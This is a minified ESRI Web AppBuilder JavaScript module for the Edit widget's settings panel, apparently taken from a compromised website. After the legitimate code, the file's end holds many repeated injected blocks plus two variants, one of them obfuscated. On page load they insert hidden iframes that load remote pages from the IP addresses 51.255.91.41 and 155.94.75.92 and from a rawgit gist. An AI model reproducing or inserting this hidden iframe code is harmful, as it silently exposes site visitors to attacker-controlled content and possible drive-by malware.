// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Edit/setting/EditFields":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/text!./EditFields.html dijit/_TemplatedMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable jimu/dijit/Popup".split(" "),function(k,f,l,m,n,a,c,d){return k([a,n],{baseClass:"jimu-widget-edit-setting-fields",templateString:m,_layerInfo:null,postCreate:function(){this.inherited(arguments);this.nls=f.mixin(this.nls,window.jimuNls.common);this._initFieldsTable();this._setFiedsTabele(this._layerInfo.fieldInfos)},
popupEditPage:function(){var a=new d({titleLabel:this.nls.configureFields,width:700,maxHeight:600,autoHeight:!0,content:this,buttons:[{label:this.nls.ok,onClick:f.hitch(this,function(){this._resetFieldInfos();a.close()})},{label:this.nls.cancel,classNames:["jimu-btn-vacation"],onClick:f.hitch(this,function(){a.close()})}],onClose:f.hitch(this,function(){})})},_initFieldsTable:function(){this._fieldsTable=new c({fields:[{name:"visible",title:this.nls.display,type:"checkbox","class":"display",width:"25%"},
{name:"isEditable",title:this.nls.edit,type:"checkbox","class":"editable",width:"25%"},{name:"fieldName",title:this.nls.editpageName,type:"text",width:"14%"},{name:"label",title:this.nls.editpageAlias,type:"text",editable:!0,width:"18%"},{name:"actions",title:this.nls.actions,type:"actions",actions:["up","down"],"class":"actions",width:"18%"}],selectable:!1,style:{height:"300px",maxHeight:"300px"}});this._fieldsTable.placeAt(this.fieldsTable);this._fieldsTable.startup()},_setFiedsTabele:function(a){l.forEach(a,
function(a){this._fieldsTable.addRow({fieldName:a.fieldName,isEditable:a.isEditable,label:a.label,visible:a.visible})},this);setTimeout(f.hitch(this,function(){l.forEach(this._fieldsTable.fields,function(a){"visible"===a.name?a.onChange=f.hitch(this,this._onDisplayFieldChanged):"isEditable"===a.name&&(a.onChange=f.hitch(this,this._onIsEditableFieldChanged))},this)}),300)},_onDisplayFieldChanged:function(a){var b=this._fieldsTable.getRowData(a);!b.visible&&b.isEditable&&(b.isEditable=!1,this._fieldsTable.editRow(a,
b))},_onIsEditableFieldChanged:function(a){var b=this._fieldsTable.getRowData(a);b.isEditable&&!b.visible&&(b.visible=!0,this._fieldsTable.editRow(a,b))},_resetFieldInfos:function(){var a=[],b=this._fieldsTable.getData();l.forEach(b,function(b){a.push({fieldName:b.fieldName,label:b.label,isEditable:b.isEditable,visible:b.visible})});this._layerInfo.fieldInfos=a}})})},"widgets/Edit/utils":function(){define(["dojo/_base/lang","dojo/_base/array","jimu/utils"],function(k,f,l){function m(a,c){var d=null;
a&&a.fields&&f.some(a.fields,function(a){if(a.name.toLowerCase()===c.toLowerCase())return d=a,!0});return d}function n(a,c,d){var f=null;if(a&&a.attributes)for(var b in a.attributes)if(a.attributes.hasOwnProperty(b)&&"function"!==typeof a.attributes[b]&&b.toLowerCase()===c.toLowerCase()){f=d?a.attributes[b]=d:a.attributes[b];break}return f}return{getFieldInfosFromWebmap:function(a,c){var d=null;(a=c.getLayerInfoByTopLayerId(a))&&(a=a.getPopupInfo())&&a.fieldInfos&&(d=k.clone(a.fieldInfos));d&&f.forEach(d,
function(a){a.format&&a.format.dateFormat&&a.format.dateFormat.toLowerCase()&&0<=a.format.dateFormat.toLowerCase().indexOf("time")&&(a.format.time=!0)});return d},getLocaleDateTime:function(a){return l.localizeDate(new Date(a),{fullYear:!0,formatLength:"medium"})},getAttrByFieldKey:function(a,c){return n(a,c)},setAttrByFieldKey:function(a,c,d){return n(a,c,d)},ignoreCaseToGetFieldKey:function(a,c){var d=null;if(a=m(a,c))d=a.name;return d},ignoreCaseToGetFieldObject:function(a,c){return m(a,c)}}})},
"widgets/Edit/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Edit/setting/EditFields.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"fieldsTable"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/Edit/setting/Setting.html":'\x3cdiv style\x3d"width:100%;"\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"firstPageDiv"\x3e\r\n    \x3ctable class\x3d"setting-table input-table" cellspacing\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n            \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.useFilterEdit}\x3c/td\x3e\r\n            \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n                \x3cdiv class\x3d"" style\x3d""\x3e\r\n                    \x3cdiv data-dojo-attach-point\x3d"useFilterEdit"\r\n                           data-dojo-type\x3d"jimu/dijit/CheckBox" /\x3e\r\n                \x3c/div\x3e\r\n            \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.toolbarVisible}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"toolbarVisible" \r\n              data-dojo-attach-event\x3d"change:_onToolbarSelected"\r\n              data-dojo-type\x3d"jimu/dijit/CheckBox"/\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr class\x3d"toolbar-options-tr" data-dojo-attach-point\x3d"toolbarOptionsTr"\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1  toolbar-options-td" data-dojo-attach-point\x3d"toolbarOptionsLabel"\x3e${nls.toolbarOptions}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1  toolbar-options-td" data-dojo-attach-point\x3d"toolbarOptionsTd"\x3e\r\n            \x3cspan class\x3d"jimu-trailing-margin05 jimu-float-leading"\x3e${nls.mergeVisible}\x3c/span\x3e\r\n            \x3cdiv class\x3d"check-box-div jimu-trailing-margin2 jimu-float-leading" style\x3d"position: relative"\x3e\r\n              \x3cdiv class\x3d"toolbar-options-coverage" data-dojo-attach-point\x3d"toolbarOptionsCoverage"\x3e\x3c/div\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"mergeVisible" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cspan class\x3d"jimu-trailing-margin05 jimu-float-leading" \x3e${nls.cutVisible}\x3c/span\x3e\r\n            \x3cdiv class\x3d"check-box-div jimu-trailing-margin2 jimu-float-leading"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"cutVisible" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cspan class\x3d"jimu-trailing-margin05 jimu-float-leading" \x3e${nls.reshapeVisible}\x3c/span\x3e\r\n            \x3cdiv class\x3d"check-box-div jimu-trailing-margin2 jimu-float-leading"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"reshapeVisible" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cspan class\x3d"jimu-trailing-margin05 jimu-float-leading" \x3e${nls.enableUndoRedo}\x3c/span\x3e\r\n             \x3cdiv class\x3d"check-box-div jimu-trailing-margin2 jimu-float-leading"\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"enableUndoRedo" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd\x3e\x3cdiv style\x3d"height: 40px;"\x3e\x3c/div\x3e\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.usingSaveButton}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"usingSaveButton" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.autoApplyEditWhenGeometryIsMoved}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"autoApplyEditWhenGeometryIsMoved" \r\n                data-dojo-type\x3d"jimu/dijit/CheckBox"\x3e \x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.snappingTolerance}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cinput data-dojo-attach-point\x3d"snappingTolerance" \r\n              data-dojo-type\x3d"dijit/form/NumberSpinner"\r\n              data-dojo-props\x3d"smallDelta:5, constraints:{min:0,max:1000,places:0}"\r\n              name\x3d"snappingTolerance"\r\n              /\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.popupTolerance}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cinput data-dojo-attach-point\x3d"popupTolerance" \r\n              data-dojo-type\x3d"dijit/form/NumberSpinner"\r\n              data-dojo-props\x3d"smallDelta:5, constraints:{min:0,max:1000,places:0}"\r\n              name\x3d"popupTolerance"\r\n              /\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first jimu-trailing-padding1"\x3e${nls.stickyMoveTolerance}\x3c/td\x3e\r\n          \x3ctd class\x3d"second jimu-leading-padding1"\x3e\r\n            \x3cdiv class\x3d"" style\x3d""\x3e\r\n              \x3cinput data-dojo-attach-point\x3d"stickyMoveTolerance" \r\n              data-dojo-type\x3d"dijit/form/NumberSpinner"\r\n              data-dojo-props\x3d"smallDelta:5, constraints:{min:0,max:2000,places:0}"\r\n              name\x3d"stickyMoveTolerance"\r\n              /\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n    \x3cdiv class\x3d"layerInfos-table" data-dojo-attach-point\x3d"layerInfosTable"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"tableInfos-loading" data-dojo-attach-point\x3d"tableInfosLoading"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"tableInfos-table" data-dojo-attach-point\x3d"tableInfosTable"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Edit/setting/css/style.css":".jimu-widget-edit-setting{margin:0; padding:0; font-size:15px;}.jimu-widget-edit-setting .editable{width: 100px;}.jimu-widget-edit-setting .edit-fields{width: 100px;}.jimu-widget-edit-setting .update{width: 200px;}.jimu-widget-edit-setting .setting-table \x3e thead \x3e tr \x3e th,.jimu-widget-edit-setting .setting-table \x3e tbody \x3e tr \x3e td{height:40px; line-height:40px; vertical-align:middle;}.jimu-widget-edit-setting .input-table \x3e tbody \x3e tr \x3e .first{width:auto; min-width: 160px; text-align: left;}.jimu-rtl .jimu-widget-edit-setting .input-table \x3e tbody \x3e tr \x3e .first{text-align: right;}.jimu-widget-edit-setting .input-table \x3e tbody \x3e tr \x3e .second{width: auto;}.jimu-widget-edit-setting .input-table \x3e tbody \x3e tr \x3e .second \x3e span{display: inline-block; height: 40px; line-height: 40px;}.jimu-widget-edit-setting .input-table .check-box-div {margin-top: 2px;}.jimu-widget-edit-setting .dijitArrowButtonContainer{width: 17px;}.jimu-widget-edit-setting .dijitSelect{height: 30px; width: 100%;}.jimu-widget-edit-setting .toolbar-options-tr {position: relative;}.jimu-widget-edit-setting .toolbar-options-tr.disable {opacity: 0.4;}.jimu-widget-edit-setting .toolbar-options-coverage{position: absolute; width: 390px; height: 40px; z-index: 1;}.jimu-widget-edit-setting .dijitTextBoxFocused{border-color: #406b9b !important; box-shadow: 0 0 0;}.jimu-widget-edit-setting .tableInfos-loading{top: 65px; position: relative;}.jimu-widget-edit-setting .tableInfos-table{display: none; margin-top: 30px; margin-bottom: 5px; position: relative;}",
"*now":function(k){k(['dojo/i18n!*preload*widgets/Edit/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable jimu/LayerInfos/LayerInfos jimu/dijit/LoadingIndicator dojo/_base/lang dojo/_base/html dojo/on dojo/_base/array dojo/promise/all ./EditFields ../utils dijit/form/NumberSpinner".split(" "),function(k,f,l,m,n,a,c,d,p,b,r,t,q){return k([l,f],{baseClass:"jimu-widget-edit-setting",_jimuLayerInfos:null,_layersTable:null,_tablesTable:null,_editableLayerInfos:null,_editableTableInfos:null,startup:function(){this.inherited(arguments);
n.getInstance(this.map,this.map.itemInfo).then(c.hitch(this,function(a){this._jimuLayerInfos=a;this._init();this.setConfig()}))},_init:function(){this._initToolbar();this._initLayersTable();this._initTablesTable()},_initToolbar:function(){this.useFilterEdit.setValue(this.config.editor.useFilterEdit);this.toolbarVisible.setValue(this.config.editor.toolbarVisible);this.enableUndoRedo.setValue(this.config.editor.enableUndoRedo);this.mergeVisible.setValue(this.config.editor.toolbarOptions.mergeVisible);
this.cutVisible.setValue(this.config.editor.toolbarOptions.cutVisible);this.reshapeVisible.setValue(this.config.editor.toolbarOptions.reshapeVisible);this.usingSaveButton.setValue(this.config.editor.usingSaveButton);this.autoApplyEditWhenGeometryIsMoved.setValue(this.config.editor.autoApplyEditWhenGeometryIsMoved);this.snappingTolerance.set("value",void 0===this.config.editor.snappingTolerance?15:this.config.editor.snappingTolerance);this.popupTolerance.set("value",void 0===this.config.editor.popupTolerance?
5:this.config.editor.popupTolerance);this.stickyMoveTolerance.set("value",void 0===this.config.editor.stickyMoveTolerance?0:this.config.editor.stickyMoveTolerance)},_initLayersTable:function(){this._layersTable=new m({fields:[{name:"edit",title:this.nls.edit,type:"checkbox","class":"editable"},{name:"label",title:this.nls.label,type:"text"},{name:"disableGeometryUpdate",title:this.nls.update,type:"checkbox","class":"update",width:"300px"},{name:"actions",title:this.nls.fields,type:"actions","class":"edit-fields",
actions:["edit"]}],selectable:!1});this._layersTable.placeAt(this.layerInfosTable);this._layersTable.startup();this.own(p(this._layersTable,"actions-edit",c.hitch(this,this._onEditFieldInfoClick,this._layersTable)))},_initTablesTable:function(){this._tablesTable=new m({fields:[{name:"edit",title:this.nls.edit,type:"checkbox","class":"editable"},{name:"label",title:window.jimuNls.common.table,type:"text"},{name:"actions",title:this.nls.fields,type:"actions","class":"edit-fields",actions:["edit"]}],
selectable:!1});this._tablesTable.placeAt(this.tableInfosTable);this._tablesTable.startup();this.own(p(this._tablesTable,"actions-edit",c.hitch(this,this._onEditFieldInfoClick,this._tablesTable)))},setConfig:function(){this._editableLayerInfos=this._getEditableLayerInfos();this._setTable(this._editableLayerInfos,this._layersTable);var e=(new a({hidden:!1})).placeAt(this.tableInfosLoading);this._getEditableTableInfos().then(c.hitch(this,function(a){e.destroy();this._editableTableInfos=a;0<this._editableTableInfos.length&&
(this._setTable(a,this._tablesTable),d.setStyle(this.tableInfosTable,"display","block"))}))},_getEditableTableInfos:function(){var a=[],h=[],g=this._jimuLayerInfos.getTableInfoArray();b.forEach(g,function(e){a.push(e.getLayerObject())},this);return r(a).then(c.hitch(this,function(){b.forEach(g,function(a){var e=a.layerObject;a=(a=a.getCapabilitiesOfWebMap())&&-1===a.toLowerCase().indexOf("editing")?!1:!0;"Table"===e.type&&e.url&&e.isEditable&&e.isEditable()&&a&&((a=this._getLayerInfoFromConfiguration(e))||
(a=this._getDefaultLayerInfo(e)),h.push(a))},this);return h}))},_getEditableLayerInfos:function(){for(var a=[],h=this.map.graphicsLayerIds.length-1;0<=h;h--){var g=this.map.getLayer(this.map.graphicsLayerIds[h]);if("Feature Layer"===g.type&&g.url&&g.isEditable&&g.isEditable()){var b=this._getLayerInfoFromConfiguration(g);b||(b=this._getDefaultLayerInfo(g));a.push(b)}}return a},_getLayerInfoFromConfiguration:function(a){var e=null,g=this.config.editor.layerInfos?this.config.editor.layerInfos:[];if((g=
g.concat(this.config.editor.tableInfos?this.config.editor.tableInfos:[]))&&0<g.length){for(var b=0;b<g.length;b++)if(g[b].featureLayer&&g[b].featureLayer.id===a.id){e=g[b];break}e&&(e.fieldInfos=this._getSimpleFieldInfos(a,e),e._editFlag=!0)}return e},_getDefaultLayerInfo:function(a){var e=this.config.editor.layerInfos&&this.config.editor.tableInfos?this.config.editor.layerInfos.concat(this.config.editor.tableInfos):null;return{featureLayer:{id:a.id},disableGeometryUpdate:!1,fieldInfos:this._getSimpleFieldInfos(a),
_editFlag:e&&0===e.length?!0:!1}},_setTable:function(a,h){b.forEach(a,function(a){var e=this._jimuLayerInfos.getLayerOrTableInfoById(a.featureLayer.id);h.addRow({label:e.title,edit:a._editFlag,disableGeometryUpdate:a.disableGeometryUpdate}).tr._layerInfo=a},this)},_getDefaultSimpleFieldInfos:function(a){for(var b=[],e,d,c=0;c<a.fields.length;c++)e=a.fields[c].editable?!0:null,d="globalid"!==a.fields[c].name.toLowerCase()&&a.fields[c].name!==a.objectIdField||a.fields[c].editable?!0:!1,b.push({fieldName:a.fields[c].name,
label:a.fields[c].alias||a.fields[c].name,isEditable:e,visible:d||e?!0:!1});return b},_getWebmapSimpleFieldInfos:function(a){var e,c,d=[],f=q.getFieldInfosFromWebmap(a.id,this._jimuLayerInfos);f?(b.forEach(f,function(b){void 0!==b.isEditableOnLayer&&q.ignoreCaseToGetFieldKey(a,b.fieldName)&&(e=b.isEditableOnLayer?b.isEditable:null,c=b.visible,d.push({fieldName:b.fieldName,label:b.label,isEditable:e,visible:c||e?!0:!1}))}),0===d.length&&(d=null)):d=null;return d},_getSimpleFieldInfos:function(a,c){var e,
d=[],f=this._getDefaultSimpleFieldInfos(a),h=this._getWebmapSimpleFieldInfos(a);e=h?h:f;c&&c.fieldInfos?(b.forEach(c.fieldInfos,function(a){if(void 0===a.visible)if(h)for(var b=0;b<h.length;b++)a.fieldName===h[b].fieldName&&(a.visible=h[b].visible||h[b].isEditable);else a.visible=!0;for(b=0;b<e.length;b++)if(a.fieldName===e[b].fieldName){d.push(a);e[b]._exit=!0;break}}),b.forEach(e,function(a){a._exit||d.push(a)})):d=e;return d},_onEditFieldInfoClick:function(a,b){(a=a.getRowData(b))&&a.edit&&(new t({nls:this.nls,
_layerInfo:b._layerInfo})).popupEditPage()},_onToolbarSelected:function(){this.toolbarVisible.checked?(d.removeClass(this.toolbarOptionsTr,"disable"),d.setStyle(this.toolbarOptionsCoverage,"display","none")):(d.addClass(this.toolbarOptionsTr,"disable"),d.setStyle(this.toolbarOptionsCoverage,"display","block"))},_resetToolbarConfig:function(){this.config.editor.useFilterEdit=this.useFilterEdit.checked;this.config.editor.toolbarVisible=this.toolbarVisible.checked;this.config.editor.enableUndoRedo=this.enableUndoRedo.checked;
this.config.editor.toolbarOptions.mergeVisible=this.mergeVisible.checked;this.config.editor.toolbarOptions.cutVisible=this.cutVisible.checked;this.config.editor.toolbarOptions.reshapeVisible=this.reshapeVisible.checked;this.config.editor.usingSaveButton=this.usingSaveButton.checked;this.config.editor.autoApplyEditWhenGeometryIsMoved=this.autoApplyEditWhenGeometryIsMoved.checked;this.config.editor.snappingTolerance=this.snappingTolerance.value;this.config.editor.popupTolerance=this.popupTolerance.value;
this.config.editor.stickyMoveTolerance=this.stickyMoveTolerance.value},_getCheckedLayerOrTableInfos:function(a,c){var e=[],d=c.getData();b.forEach(a,function(a,b){a._editFlag=d[b].edit;a.disableGeometryUpdate=d[b].disableGeometryUpdate;a._editFlag&&(delete a._editFlag,e.push(a))});return e},getConfig:function(){this._resetToolbarConfig();var a=this._getCheckedLayerOrTableInfos(this._editableLayerInfos,this._layersTable);0===a.length?delete this.config.editor.layerInfos:this.config.editor.layerInfos=
a;a=this._getCheckedLayerOrTableInfos(this._editableTableInfos,this._tablesTable);0===a.length?delete this.config.editor.tableInfos:this.config.editor.tableInfos=a;return this.config}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});